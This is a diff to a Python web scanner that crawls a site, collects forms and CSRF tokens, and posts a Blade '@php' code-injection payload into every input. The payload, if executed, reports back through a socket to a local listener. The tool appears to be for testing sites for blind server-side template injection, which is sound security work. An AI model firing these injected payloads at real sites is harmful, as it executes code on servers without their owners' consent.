@@ -52,7 +52,7 @@ def get_page_urls(html):
 
 def check_nested_links(required_links):
     """
-    Iterates through collected links and checks for new ones in them
+    This function iterates through collected links and checks for new ones in them
     """
 
     nested_links = []
@@ -72,7 +72,7 @@ def check_nested_links(required_links):
 
 def locate_input_points(html):
     """
-    Finds all text input tags and returns their names
+    This function finds all text input tags and returns their names
     """
 
     # find all input tags including token
@@ -112,8 +112,8 @@ def post_url(html):
     """
     This function finds all form action links in a page, and returns only the required form action links
     """
+
     post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]
-    #formatted_links = []
 
     #for link in post_links:
     formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
@@ -126,6 +126,7 @@ def get_token(html):
     """
     This function grabs the token for each given form
     """
+
     token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
     return token
 
@@ -135,6 +136,7 @@ def get_forms(html):
     This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
     and pair them together.
     """
+
     form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s'\\\\]+</form>)+", html)
 
     link_groups = {}
@@ -169,11 +171,16 @@ def test_blind_posterior(urls):
                 inputs = groups[group]
 
                 for inp in inputs:  # Give each input a value and add to dictionary
-                    post_data[inp] = f"""@php $sock = fsockopen('localhost', 9000);
-                                              $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-                                              $url = $protocol . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; 
-                                              fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
-                                              fclose($sock) @endphp"""
+                    post_data[inp] = f"""@php 
+                                              try{{
+                                                  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+                                                  $url = $protocol . $_SERVER['SERVER_NAME'] . ":". $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI']; 
+                                                  $sock = fsockopen('localhost', 9000);
+                                                  fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
+                                                  fclose($sock);
+                                              }}
+                                              catch(Exception $e){{}}
+                                         @endphp"""
                 post_data["_token"] = token  # Add token last
                 requests.post(group, post_data, cookies=cookies)
 
@@ -181,16 +188,13 @@ def test_blind_posterior(urls):
             scan_result.append("URL: " + url + " isVulnerable: Unable to test, no input points found")
             continue
 
-    #while True:
+
     server_instance = subprocess.Popen(['python', 'SocketServer.py', ' '.join(urls)])
     while server_instance.poll() is None:
+        if(server_instance.poll() != None):
+            break
         pass
-    #server_instance.wait()
-    #stdout, stderr = server_instance.communicate()
 
-        # server_response = stdout.strip()
-        # if(server_response == "stop"):
-        #     break
 
 # Begin the scanning process
 html = begin_scan()
@@ -200,6 +204,3 @@ urls = get_page_urls(html)
 nested_links = check_nested_links(urls)
 filtered_urls = filter_links(urls+nested_links)
 stored_imm_results = test_blind_posterior(filtered_urls)
-
-# for result in stored_imm_results:  # print results
-#     print(result)
